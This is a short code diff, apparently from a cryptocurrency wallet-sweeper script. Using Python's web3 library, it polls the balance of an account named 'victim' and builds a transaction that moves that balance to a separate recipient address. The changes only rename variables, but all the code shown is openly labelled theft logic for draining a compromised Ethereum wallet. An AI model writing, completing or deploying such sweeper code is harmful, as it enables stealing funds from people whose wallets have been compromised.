@@ -30,7 +30,7 @@ def get_balance_loop():
         while 0.0005>balance:
             #Get balance account
             try:
-                balance = web3.eth.getBalance(victim_account)
+                balance = web3.eth.getBalance(victim_address)
                 balance = web3.fromWei(balance, "ether") #convert to ether value
             except:
                 print("error , i can't get balance...")
@@ -49,11 +49,11 @@ def get_balance_loop():
 def build_transaction(balance):
     try:
         #get nonce number
-        nonce = web3.eth.getTransactionCount(victim_account)
+        nonce = web3.eth.getTransactionCount(victim_address)
         #build transaction
         tx = {
             'nonce':nonce,
-            'to':reciver_account,
+            'to':recipient_address,
             'value':web3.toWei(balance,'ether'),
             'gas':21000,
             'gasPrice':web3.toWei('56','gwei')
